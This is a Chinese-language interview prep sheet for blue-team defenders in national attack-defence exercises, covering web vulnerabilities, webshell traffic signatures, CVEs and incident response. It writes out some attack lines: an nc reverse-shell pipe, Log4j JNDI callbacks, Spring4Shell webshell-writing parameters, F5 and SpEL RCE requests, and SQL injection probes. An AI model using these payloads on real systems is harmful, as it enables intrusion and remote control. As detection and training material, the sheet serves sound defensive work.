@@ -1,0 +1,1157 @@
+
+HW
+护网担任角色
+监控 研判 处置
+应急
+溯源
+带队
+安全设备
+蜜罐
+
+腾讯Waf
+长亭waf
+天融信waf
+
+ips 入侵防御系统（IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层）
+nips腾讯天幕
+
+ids 入侵检测系统（IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击）
+奇安信天眼 
+奇安信ngsoc
+腾讯御界nta
+
+hids 主机入侵检测系统（主机安全）
+青藤云设备 
+奇安信椒图 
+腾讯云镜 
+设备原理
+前期准备工作
+个人前期准备案例
+甲方提供资产范围，做资产收集梳理，是否存在未备案的资产
+梳理出核心资产、边界资产
+
+由于子公司没有安全服务团队，对资产进行渗透测试
+使用安全厂商设备安全扫描
+上报漏洞，提供修复方案/临时修复方案，跟踪修复进度情况（指定修复时间）
+
+边界资产能否下线处置，提出合理化建议
+
+外网高危端口采用白名单访问
+网络区域划分
+（dmz区、办公终端、核心业务、上下游公司、供应链接入区）
+安全设备
+设备类型：蜜罐、waf、网络层、终端层、日志汇总态势
+安全覆盖范围：主域/子域/子公司
+值守人员安排：监控-研判-处置-应急-溯源
+资产梳理
+外网
+外网暴露资产：ip、域名、端口、运行服务、中间件、口令强度、源码泄露
+远程接入点：vpn、Rdp、vnc、远程终端管理系统
+
+内网
+内网资产：ip、端口、开放服务、系统版本、口令强度、域控安全
+重点关注资产：域控、邮件、OA、堡垒机、运维人员机器、自动化运维
+加强人员安全意识
+防钓鱼
+防弱口令
+红队攻防演习
+寻找互联网暴露面切入点
+安全加固
+基线检查、漏洞补丁、升级版本、增强口令、邮箱拦截、代码审计、白名单访问
+研判
+web基础
+Web Top10
+1. SQL注入 
+2. 失效的身份认证 
+3. 敏感数据泄露 
+4. XML外部实体（XXE） 
+5. 失效的访问控制 
+6. 安全配置错误 
+7. 跨站脚本（XSS） 
+8. 不安全的反序列化 
+9. 使用含有已知漏洞的组件 
+10. 不足的日志记录和监控
+SSRF CSRF区别
+客户端/服务端/请求伪造
+SSRF原理/利用/防御/绕过/挖掘
+服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。
+
+SSRF 防御
+1.	设置URL白名单或者限制内网IP
+2.	统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态
+3.	限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等
+4.	禁用不需要的协议，仅仅允许HTTP和HTTPS
+SSRF利用
+1.dict协议，泄露安装软件版本信息，查看端口，操作内网redis服务等
+2.file协议，在有回显的情况下，利用 file 协议可以读取任意内容
+3.gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell
+4.http/s协议，探测内网主机存活
+SSRF挖掘
+1.分享：通过URL地址分享网页内容
+2.转码服务
+3.在线翻译
+4.图片加载与下载：通过URL地址加载或下载图片
+5.图片、文章收藏功能
+6.未公开的api实现以及其他调用URL的功能
+7.从URL关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain
+Xss原理/分类/防御/绕过/挖掘
+xss原理
+web页面用户输入可控，插入恶意Js代码或被存储进数据库中，浏览器解析执行获取用户cookie。
+
+xss分类
+反射性/dom型/存储
+
+xss防御
+1.	正则过滤（标签/js代码/事件）
+2.	用户的输入进行html编码输出（无法进行闭合）
+3.	服务端设置会话Cookie的HTTP Only属性（不能获取cookie）
+4.	限制长度
+
+xss绕过
+1.	大小写/双写/镶嵌
+2.	url编码/html实体编码/编码单个字符
+3.	禁用哪些标签，更换标签
+4.	<input><script>绕过实体编码
+5.	禁用哪些js代码，更换代码
+6.	禁用什么事件，更好事件
+
+xss挖掘
+重灾区：评论区、留言区、个人信息、订单信息等
+针对型：站内信、网页即时通讯、私信、意见反馈
+存在风险：搜索框、当前目录、图片属性等
+
+SQL原理/分类/防御/绕过
+sql原理
+对用户输入的数据没有进行严格的过滤与判断，导致用户构造各种恶意payload拼接进后台数据库查询语句中执行。
+
+sql分类
+常见（联合查询，布尔，延时，报错）
+其他（宽字节，堆叠，等等）
+
+sql防御
+代码层面
+1.	正则过滤
+2.	Php转义函数
+3.	预编译（pdo）
+4.	权限分明/权限限制
+网络层面
+waf设备
+
+sql绕过
+
+SQL报错注入有哪些
+floor() 报错注入
+name_const()报错注入
+exp()报错注入
+convert()报错注入
+extractvalue() 报错注入，返回数据长度限制,最长32位
+updatexml() 报错注入，返回数据长度限制,最长32位
+SQL注入函数有哪些
+逻辑运算符and，or，||
+联合查询Union select
+查询字段 order by
+报错注入floor() ，name_const()，exp()，convert()，extractvalue() ，updatexml()
+SQL宽字节注入原理/条件
+目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url编码是 %5c，如果目标站点使用的是gbk编码，则可以构造 payload   %df 加 单引号，%df与%5c进行结合成为一个汉字，而单引号则逃逸了出去
+SQL注入如何判断数据库类型
+1.	端口
+2.	页面报错信息
+3.	各个数据库特有的数据表
+mssql数据库
+and (select count(*) from sysobjects)>0 and 1=1
+access数据库
+and (select count(*) from msysobjects)>0 and 1=1
+mysql数据库(mysql版本在5.0以上)
+and (select count(*) from information_schema.TABLES)>0 and 1=1
+oracle数据库
+and (select count(*) from sys.user_tables)>0 and 1=1
+4.各数据库特有的连接符判断数据库类型：
+mssql数据库
+and '1' + '1' = '11'
+mysql数据库
+and '1' + '1' = '11'
+and CONCAT('1','1')='11'
+oracle数据库
+ and CONCAT('1','1')='11'
+
+4.SQLserver数据库
+延时注入	page.asp?id=';WAITFOR DELAY '00:00:10'; --
+默认变量	page.asp?id=sql'; SELECT @@SERVERNAME --
+触发错误有可能会报出DBMS类型	page.asp?id=0/@@SERVERNAME
+5.MySQL有一个内置的 BENCHMARK() 函数，可以测试某些特定操作的执行速度
+SQL注入不存在回显
+1.	因为关闭了错误回显/没有回显位
+2.延时 布尔注入
+3.dnslog取回显
+Mysql数据库站点无法链接
+1.	mysql数据库链接不对外开发，只允许本地链接
+2.	站库分离
+3.	更改了端口
+Mysql写shell有几种
+1创建表导出
+2一句话导出
+3日志备份获取shell
+Mysql无法写shell原因
+1.	My.ini配置secure-file-priv为空或/ 则可以导出导入无限制
+2.	绝对路径不正确
+3.	权限不足/没有读写权限
+4.	站库分离
+Csrf 原理/利用/防御
+Csrf 原理
+客户端跨站请求伪造
+
+Csrf 利用
+构造好恶意请求包，钓鱼
+
+Csrf 防御
+1.验证HTTP Referer字段 添加Token字段并验证 添加自定义字段并验证
+2.推荐人请求头
+2.同源检测
+
+Xxe原理（xml外部实体注入）/防御
+
+XML外部实体注入，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，产生漏洞。
+
+服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的URL支持 file:// 和 ftp:// 等协议，导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站等危害
+
+Xxe防御 
+XML解析库在调用时严格禁止对外部实体的解析
+JAVA反序列化
+Java序列化是指把Java对象转换为字节序列的过程；
+
+Java反序列化是指把字节序列恢复为Java对象的过程；
+
+Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
+
+java序列化数据特征	序列化文件头，数据16进制中以  ac ed 00 05开头
+tcp	必有ac ed 00 05，这个16进制流基本上也意味者java反序列化的开始
+http	必有rO0AB，其实这就是aced0005的base64编码的结果
+
+
+常见端口
+（此处可扩展，直接问指定端口可能是什么服务）
+
+21 ftp，22 ssh，23 Telnet，53 DNS，80 http，443https，135/445 samba服务，443 https，1433 sqlserver，1521 Oracle,3306 mysql，3389 rdp远程，7001-7002weblogic，8080 jboos/Tomcat，8888 宝塔,6379 redis，50050 cs
+数据库：1433 sqlserver 1521 oracle 3306mysql
+远程连接：22ssh  3389 rdp
+主机：21 ftp 53dns 23 telnet
+文件上传
+基于前端 js	1.burp抓包修改绕过
+2.禁用指定js文件
+基于后端 mime	1.Content-Type（文件mime）
+2.基于body 标识头
+基于简单过滤	1.双写后缀
+2.大小写
+基于后端 黑名单	拦截指定的后缀名
+FUZZ 可利用扩展	1.FUZZ 可上传扩展名（不在黑名单，可被解析利用）
+2.htaccess文件（.htaccess文件是Apache服务器中的分布式配置文件，启用和关闭在 httpd.conf 文件中配置· mod_rewrite 模块开启· AllowOverride All）
+3..user.ini文件 （自 PHP 5.3.0 起，.user.ini是一个能被动态加载的ini文件，此类文件仅被 CGI／FastCGI SAPI 处理。）
+（不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载）
+4.html文件（存储型xss）
+5.soap，asmx文件（xml rce）
+系统特性	1.后缀添加 空格，添加 点，添加 冒号，基于特性被删除 （windows）
+2.后缀添加 斜杠 ，基于特性被删除（windows/linux）
+3.后缀添加NTFS数据流（::$DATA），基于特性（windows）
+容器解析特性	1.Apache 容器解析特性（1.X/2.X版本，解析文件名的方式是从后向前识别扩展名，遇见可识别的扩展名为止，都不可识别则报错）（/1.php.abcd）
+2.Apache HTTPD 换行解析漏洞（2.4.0-2.4.29版本，burp抓包，Hex选项卡.php后面右键-Insert byte，添加一个0a，访问1.php/x0a将被按照PHP后缀进行解析）
+3.%20%00空字节代码解析漏洞 （nginx 0.8.41~1.5.6）https://www.cnblogs.com/bmjoker/p/9838600.html
+ 	 
+基于后端 白名单	只运行指定的后缀名
+配置文件	1.htaccess文件（.htaccess文件是Apache服务器中的分布式配置文件，启用和关闭在 httpd.conf 文件中配置· mod_rewrite 模块开启· AllowOverride All）
+2.html文件（存储型xss）
+文件包含	1.包含解析存在webshell的文件
+2.tomcat ajp协议任务文件包含
+3.thinkphp 任意文件包含日志getshell
+容器解析特性	1.IIS 目录解析 （5.X/6.0版本，目录名包含.asp、.asa、.cer、.cdx、目录下文件都按照asp解析执行）（/text.asp/1.jpg）
+2.IIS 文件名解析 （5.X/6.0版本，文件名包含.asp;、.asa;、.cer;、.cdx;、优先按照asp解析执行）（/1.aps;1.jpg）
+配置不当	1.PHP CGI解析漏洞（php.ini配置文件cgi.fix_pathinfo=1，（/1.jpg/1.php）（/1.jpg/.php）1.jpg以php来解析）
+编辑器漏洞	1.	UEditor任意文件上传
+1.FCKeditor编辑器 2.EWEbeditor编辑器 3.DotNetTextBox编辑器 4.Kedit编辑器 5.Cute Editor 在线编辑器
+
+文件包含 原理/利用
+文件包含 原理
+文件包含解析执行
+
+文件包含 利用
+1.	包含日志文件（thinkphp 日志文件包含）
+2.	含被污染的SSH日志来getshell
+3.	包含图片马
+4.	包含session文件
+5.	file协议
+6.	如果是Php后端，可能存在php伪协议
+
+
+支付漏洞理解
+后端与前端检验不严谨，缺乏多重校验
+越权/原理/分类
+原理
+缺乏对用户身份的严格校验，存在缺陷的验证机制
+分类
+垂直，用户权限提升/切换
+水平，用户身份/切换/平权
+工具基础
+sqlmap扫https会出现什么问题？
+使用sqlmap注入https的网站时，如果没有进行任何处理则会报错如下，连接不了目标。就是因为ssl证书的原因，而且sqlmap它是不能自动伪造ssl证书的
+
+1.	添加 --force-ssl 参数
+2.	走本地代理端口访问
+
+指纹识别工具的原理是什么？
+说一下常用的shell工具，**相比其他shell工具的优点
+说一下常用的扫目录工具，优缺点
+常用威胁情报平台
+Viurstotal virustotal.com 
+微步威胁情报中心 x.threatbook.cn 
+360威胁情报中心 ti.360.cn 
+奇安信威胁情报中心 ti.qianxin.com 
+绿盟威胁情报中心 nti.nsfocus.com 
+安恒威胁情报中心 ti.dbappsecurity.com.cn VenusEye
+威胁情报中心 venuseye.com.cn
+
+流量研判/分析能力
+常见攻击流量有哪些？
+SSRF / 相关函数
+file_get_contents、fsockopen、curl_exec、fopen、readfile等函数使用不当会造成SSRF漏洞
+php代码执行 / 函数
+Eval	代码执行函数（）字符串被当作php代码执行
+Assert	代码执行函数（）与eval类型，字符串被当作php代码执行
+
+php命令执行 / 函数
+system()函数执行有回显，将执行结果输出到页面上
+passthru()函数执行有回显，将执行结果输出到页面上 
+exec()函数执行无回显，默认返回最后一行结果
+shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面
+
+popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。
+proc_open()函数与Popen函数类似，但是可以提供双向管道
+pcntl_exec函数的作用是在当前进程空间执行指定程序
+
+Php文件包含 / 函数
+require	函数一般放在PHP脚本的最前面，PHP执行前就会先读入require指定引入的文件，包含并尝试执行引入的脚本文件
+包含的过程中如果出现错误，会抛出一个警告并退出程序的执行
+require_once	只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题
+include	include载入的文件不会判断是否重复，只要有include语句，就会载入一次（即使可能出现重复载入）
+可以放在PHP脚本的任意位置，一般放在流程控制的处理部分中。当PHP脚本执行到include指定引入的文件时，才将它包含并尝试执行
+包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行
+include_once	只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题
+
+复现过哪些中间件/组件/框架/漏洞
+常见业务逻辑漏洞
+
+任意用户密码重置 短信轰炸 支付漏洞 忘记密码绕过  验证码复用 越权
+
+常见未授权漏洞
+1. MongoDB 未授权访问漏洞 
+2. Redis 未授权访问漏洞 
+3. Memcached 未授权访问漏洞 
+4. JBOSS 未授权访问漏洞 
+5. VNC 未授权访问漏洞 
+6. Docker 未授权访问漏洞 
+7. ZooKeeper 未授权访问漏洞 
+8. Rsync 未授权访问漏洞
+9. 阿里diuid
+
+常见中间件漏洞
+IIS：PUT漏洞、短文件名猜解、远程代码执行、解析漏洞 
+Apache：解析漏洞、目录遍历 
+Nginx：文件解析、目录遍历、CRLF注入、目录穿越 
+Tomcat：远程代码执行、war后门文件部署 
+JBoss：反序列化漏洞、war后门文件部署 
+WebLogic：反序列化漏洞、SSRF任意文件上传、war后门文件部署 
+Apache Shiro反序列化漏洞： Shiro rememberMe（Shiro-550）、Shiro Padding Oracle Attack(Shiro-721)
+
+存在 任意文件读取 框架/中间件/组件 
+蓝凌OA前台任意文件读取
+apache
+apache tomcat
+存在ssrf 框架/中间件/组件 
+weblogic
+存在 反序列化 中间件
+Jboos
+Shiro
+Apache tomcat
+Weblogic
+fastjson
+
+Weblogic 存在哪些漏洞
+
+1.基于Weblogic t3协议引起远程代码执行的反序列化漏洞
+
+2.通过非法字符绕过访问，然后通过Gadget调用命令执行
+
+3.任意文件上传
+Apache tomcat 存在哪些漏洞
+
+CVE-2017-12615 任意写文件漏洞
+
+CVE-2020-1938 AJP 文件包含漏洞
+
+后台弱口令getshell
+反序列化
+shiro反序列化的形成原因、利用链
+利用链很多，不熟
+讲下RMI原理以及相关的漏洞
+Shiro550反序列化的原理及利用工具编写思路
+Shiro 550 shiro 721 漏洞区别
+Shiro-550（<1.2.4版本）（AES加密）不需要有效的用户cookie，只要遍历到正确的key，就可以利用（漏洞产生就是因为默认key）
+
+Shiro-721（<1.4.2版本） （AES-128-CBC 模式加密）（不需要知道key）条件受限，需要一个已经登录/合法的用户cookie，进行Padding Oracle填充攻击构造恶意的反序列化。
+
+讲讲IIOP和T3反序列化原理
+如何判断攻击利用是否成功？
+利用是否成功 分为 有回显/无回显
+
+有回显
+比如sql注入的报错/联合、任意文件读取、文件探测、命令执行、文件上传
+
+主要看请求包的payload执行了什么，再看服务器响应状态码，响应内容，里面有没有敏感信息，有没有达到恶意payload想要的内容
+
+
+无回显
+比如xss盲打，sql注入的延时/布尔，RCE无回显利用
+
+无回显的利用，一般都是 dnslog测试/直接反弹shell/直接写文件webshell，这种高危操作一般需要上机排查，或者复现，或者配合ids主机安全的设备来查看 有没有外带/反弹/webshell
+
+或与运维人员确定受影响资产的一个 系统框架/组件/中间件 版本，是否在受影响范围内
+如何辨别shiro是否利用成功？
+1.	Cookie 很长 
+2.	cookie正确的话，服务端不会再响应 set_cookie: rememberMe 字段
+3.	大部分shiro存在回显，响应包存在回显消息，也可能不回显或者直接反弹shell
+4.	与设备运维人员确认是否使用默认Key，shiro版本等，如果使用默认key，使用key对疑似攻击请求包进行解密研判。
+
+如何判断log4j2是否利用成功？
+1.	出网一般走 rmi ldap dns，配合ids主机防御系统，查看目标主机是否存在外带攻击
+2.	查看流量态势，目标主机是否存在 dnslog活动
+3.	下载目标恶意类，查看目标恶意类执行什么内容
+4.	复现攻击
+Shiro 反序列化原理
+cookie字段使用默认key解密后，反序列化数据中加入 恶意payload
+Fastjson原理
+在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是bytecodes，有部分函数会根据这个bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数
+Log4j2漏洞原理
+Log4j2 是个日志组件，中提供了Lookups 机制，用于添加一些特殊值到日志中，在 Lookups 机制中，由于 JNDI 功能没有对名称解析做限制，而某些协议是不安全的，可以允许远程代码执行，从而导致RCE漏洞。
+
+Redis 未授权原理
+1.	没有设置登录验证导致免密码登录
+2.	没有ip限制
+3.	没有开启安全模式
+Redis 利用
+1.	写入公钥
+2.	写webshell
+3.	计划任务反弹shell
+冰蝎/流量特征
+3.0 加密
+
+jsp文件
+
+Java 
+
+base64解密 -> AES128加密
+
+弱特征：内置25个ua请求头，可修改源码
+
+弱特征：初始化的请求头部 type 属于固定值
+
+2.0中采用协商密钥机制。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥
+
+密钥传递阶段
+
+先通过get方式请求服务端，URL传递pass的整型参数，参数内容为随机数
+
+服务端响应包长度为16，body内容为随机数MD5的16位作为的密钥，明文传递
+
+3.0中改了，去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16]
+菜刀/流量特征
+2011-2014版本菜刀	 
+php类webshell	特征主要存在body中
+
+1.eval函数或assert函数用于执行传递攻击的payload
+2.使用post或get或request接收所传输的数据
+3.base64_decode函数解码 传输的数据
+4.响应包存在->| |<- ，包含执行结果
+jsp类webshell	该流量是WebShell链接流量的第一段链接流量，
+其中特征主要在i=A&z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。
+ 
+注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。
+asp类webshell	特征主要存在于body中
+1.execute函数用于执行传递攻击的payload，等同于eval
+2.OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。
+3.Response.Write和Response.End是必有的，是来完善整个操作的
+ 	 
+2016版本菜刀	最大的改变就是将特征进行打断混淆
+php类webshell	1.base64_decode函数进行打断连接（"ba"."se"."64"）
+2.@eval函数进行打断连接（"@e"."v"."al"）或assert函数
+3.依旧是base64编码，进行解密查看攻击明文识别
+jsp类webshell	同2011-2014版本
+asp类webshell	body中unicode编码替换混淆
+直接将这部分代码直接进行unicode解码
+其他同2011-2014版本
+
+哥斯拉/流量特征
+**工作原理：** 
+
+**1、基于流量，HTTP全加密的webshell** 
+
+**2、AES加密** 
+
+**流量特征：** 
+
+**1、低版本会有特征，是强特征**
+
+**2、发送一段固定代码(payload)，http响应为空** 
+
+**3、发送一段固定代码(test)，执行结果为固定的** 
+
+**4、在发送疑端固定代码(getGacisInfo)** 
+
+蚁剑/流量特征
+payload存在于	body内
+body参数内容存在	ini_set（）函数
+set_time_limit（）函数
+echo 函数
+eval 函数
+ua头	antsword/v2.1
+ 	 
+编码方式	编码结果
+                                    default	@ini_s                            
+base64	QGluaV9z                            
+                                    chr	cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115)                            
+                                    chr16	cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73)                            
+                                    rot13	@vav_f   
+JAVA反序列化/流量特征
+
+16进制流中
+java序列化数据特征	序列化文件头，数据16进制中以  ac ed 00 05开头
+tcp	必有ac ed 00 05，这个16进制流基本上也意味者java反序列化的开始
+
+Struts2/流量特征
+1.GET，POST，content-type
+2.*.action文件/*.jsp文件
+3.JAVA开发
+4.OGNL表达式注入
+5.%{}
+shiro反序列化/流量特征
+1.	cookie传输
+2.	响应头：Set-Cookie: rememberMe=deleteMe
+3.	请求头:  rememberMe=cookie
+4.	参考java反序列化流量特征
+5.	Ase 加密
+6.	550/721的利用 cookie 进行填充之后 很长
+
+Shiro 权限绕过/流量特征
+1.	路径后面%2f
+2.	路径前面  ..;
+log4j2流量特征
+懂得都懂
+${}
+Jndi注入
+Ldap
+Rmi
+dns
+Ip
+Log4j2混淆绕过/流量特征
+1.	可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字，${:::::-j}${what:-n}${ls:-d}${1QAZ2wxs:-i}
+${j${sdasd:-n}d${sddd:-i}:ldap://dns.log}
+2.	虽然除了 JNDI 之外的核心包里的 Lookup 不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步的攻击，例如使用 ${hostName}、${env:USERDOMAIN}、${env:COMPUTERNAME} 配合 dnslog 快速定位受影响机器进行修复。
+
+Log4j2 影响范围
+Log4j 1.x
+SpringBoot
+Apache Struts2
+Apache Solr
+/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
+vmware 产品线
+Apache Flink
+Apache Druid
+Spring Framework 
+CVE-2022-22965
+（利用获取到的属性构造利用链，修改 Tomcat 中日志相关的属，日志文件写入 webshell 达到命令执行的目的）
+流量特征：
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+Spring Cloud Gateway
+（SpEL表达式注入）
+流量特征：
+POST /actuator/gateway/refresh
+GET /actuator/gateway/routes/EchoSec
+#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}
+
+F5-BIG-IP RCE(CVE-2022-1388)
+（未授权绕过RCE）
+X-F5-Auth-Token为空时走入另一条验证流程，而这个流程依赖于我们给header提供的Authorization:字段。因为Authorization字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。接着就是如何设置X-F5-Auth-Token为空
+流量特征：
+POST /mgmt/tm/util/bash 
+        'Content-Type': 'application/json',
+        'Connection': 'keep-alive, x-F5-Auth-Token',
+        'X-F5-Auth-Token': 'a',
+        'Authorization': 'Basic YWRtaW46'
+{"command":"run","utilCmdArgs":"-c id"}
+
+Fastjson/流量特征
+1.json数据传输
+2.json数据中@type
+3.JAVA代码
+4.RMI LOAP协议
+5.常见利用链（cc3 cc5）
+6.高危类
+分块传输/流量特征
+post请求，请求头存在Transfer-Encoding: chunked字段
+渗透基础
+SSRF 禁用 127.0.0.1 后如何绕过？
+添加@绕过www.baidu.com@127.0.0。1，将127.0.0.1进行转换，转换为其他进制的数从而绕过检测
+进制转换结果如下
+0177.0.0.1 //八进制
+0x7f.0.0.1 //十六进制
+2130706433 //十进制
+
+XSS除了获取cookies还能做什么
+
+页面跳转，后台URL、面，获取IP
+
+获取管理员ip xss蠕虫 钓鱼攻击 前端JS挖矿 键盘记录 屏幕截图
+CSRF_TOKEN的位置以及原理和绕过
+手工判断目标系统
+1.大小写检测：Windows大小写不敏感，而Liunx大小写敏感 
+2.ping
+默认返回值判断（tll值可修改）
+windows
+128
+WINDOWS NT 2000
+128
+WINDOWS 95/98
+32
+UNIX
+255
+路由器
+255
+LINUX
+64
+WIN7
+64
+http参数污染
+由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。
+http 参数
+Baypass waf
+host碰撞
+带host的请求直接到反代服务器的ip，反代服务器上面的对应host配置如果还在，就会把请求转发到后面即内网中的对应host业务服务器上，导致网站的域名删除了A记录的情况下也能访问/直接访问内网业务系统
+
+mysql的用户名密码是存放在那张表里面 mysql密码采用哪种加密方式
+
+webshell命令执行无回显
+1.	dnslog外带信息
+2.	直接反弹shell
+3.	防火墙拦截
+4.	命令执行 
+讲一下你的渗透测试流程
+根据个人渗透经验判断（重点在于信息收集）
+
+信息收集的方法
+子域名收集的方法
+
+绝对路径获取方法
+1.	报错
+2.	Fuzz
+3.	Php探针
+
+json格式的数据包测哪些漏洞
+fastjson
+Cookie字段你会测试什么内容
+sql注入
+越权
+Log4j2
+Shiro
+cookie安全
+如果你Xss打了后台，发现是内网的怎么办
+
+如何判断是否使用cdn
+全球Ping，地区节点返回ip不同，访问速度一致
+
+上传大马，访问乱码有什么解决方法
+修改浏览器编码
+PHP和Java的文件包含区别
+
+小程序的渗透和普通渗透的差异
+
+渗透过程不变，依旧是抓包修改参数渗透 不同点是小程序会将包下载到本地，可以使用逆向还原工具反编译
+说说你APP测试的经验
+在外网打点过程中， 常用的信息收集工 具有哪些？  
+ENScan 企业信息查询工具 
+Oneforall 子域名收集工具 
+水泽 信息收集自动化工具 
+FOFA、Goby 网络空间资产检索\攻击面测绘工具 
+Masscan 端口扫描工具 
+ARL 资产安全灯塔 快速侦察与目标关联的资产工具
+你通过java站入侵了Windows，你Windows什么权限？
+
+判断出靶标的CMS，对外网打点有什么意义？
+1. 判断当前使用的CMS是否存在Nday，尝试利用公开的POC、EXP进行测试
+2. 根据CMS特征关联同CMS框架站点，进行「敏感备份文件」扫描，有可能 获取到站点备份文件。尝试从CMS源码进行代码审计，挖掘潜在漏洞。
+平时挖过哪些SRC CNVD证书
+
+内网
+linux除了bash反弹shell，还有哪些方法反弹shell？
+java，python，php，openssl，Telnet，socat，awk，powershell
+Linux nc不支持 -e情况下，如何反弹？
+通过mknod创建管道反弹shell
+在这种情况下可以通过创建管道，然后将默认shell环境的输入重定向给刚才创建的管道，最后将输出重定向到管道中
+mknod /tmp/bmz p
+/bin/bash 0</tmp/bmz | nc IP PORT 1>/tmp/bmz
+linux提权
+sudo滥⽤提权
+内核漏洞提权（脏牛提权，sudo溢出提权）
+suid提权
+第三方服务提权（数据库，nfs提权）
+计划任务提权
+高权限劫持提权
+
+Windows提权
+1.系统内核溢出
+2.系统配置错误提权
+	2.1 系统服务权限配置错误
+	2.2 计划任务
+3.组策略首选项提权
+4.绕过UAC提权
+5.不带“号的路径
+数据库提权
+MySQL 
+1- mof提权 2- udf提权 3- VBS启动项提权
+SQLserver 
+1-xp_cmdshell 扩展存储函数提权 2-差异备份提权
+最近的linux提权有了解吗？
+CVE-2022-0847
+ 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。 CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。
+CVE-2021-4034
+Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令 pkexec 后跟要执行的命令（具有 root 权限）。
+
+最近的windows提权有了解吗?
+
+出网协议有哪些
+dns通杀
+
+https 加密
+
+Smb
+内网工具常用哪些
+内网服务器，如何进行信息收集
+本机信息收集：管理密码、登录日志看管理员ip、服务密码收集、网段信息查看、历史记录查看 内网DNS域传送漏洞
+使用脚本收集：端口信息、服务信息 系统命令收集：
+域内用户可使用域命令收集域信息，net group "domain users" /domain等 端口扫描工具全段扫描 
+
+拿到 webshell 后会做什么操作（windows）
+3389 无法连接的几种情况?
+正向代理和反向代理的区别？
+讲下Spring相关的RCE原理
+正向Shell和反向Shell的区别是什么？
+有哪些反向代理的工具
+谈谈内网流量如何出来
+清理日志要清理哪些
+
+导出域用户hash
+密码喷洒攻击
+pth原理
+应急
+应急处置
+1. 收集信息：收集告警信息、客户反馈信息、设备主机信息等 
+2. 判断类型：安全事件类型判断。（钓鱼邮件、Webshll、爆破、中毒等） 
+3. 控制范围：隔离失陷设备 
+4. 分析研判：根据收集回来的信息进行分析 
+5. 处置：根据事件类型进行处置（进程、文件、邮件、启动项、注册表排查等） 
+6. 输出报告
+攻防演练/重保过程中，发生真实攻击，你如何应急/流程？
+1.（攻击确认）研判分析告警内容，是否为真实攻击/误报，真实攻击封禁ip，是否利用成功
+2.（事件类型确定）根据告警确定事件类型，勒索/挖矿/蠕虫/钓鱼/文件上传/webshell流量/反弹shell/外联/敏感操作
+3.（范围确定）根据安全设备确定受影响资产/主机设备范围
+4.（抑制扩散/横向）甲方允许/且对业务不造成重大影响的情况下对已沦陷/受影响设备，进行一个断网阻断/或者是不出网的防火墙策略，或是web业务下线。
+5.（主机排查）根据事件类型上机排查，清除webshell、结束目标/外联/恶意进程。再对目标可能存在的权限维持手段进行排查清除。
+6.（内网影响范围）基于hids主机防御系统，查看失陷主机有没有进行一个内网横向渗透阶段，关注同网段主机设备是否存在被攻击/失陷可能。
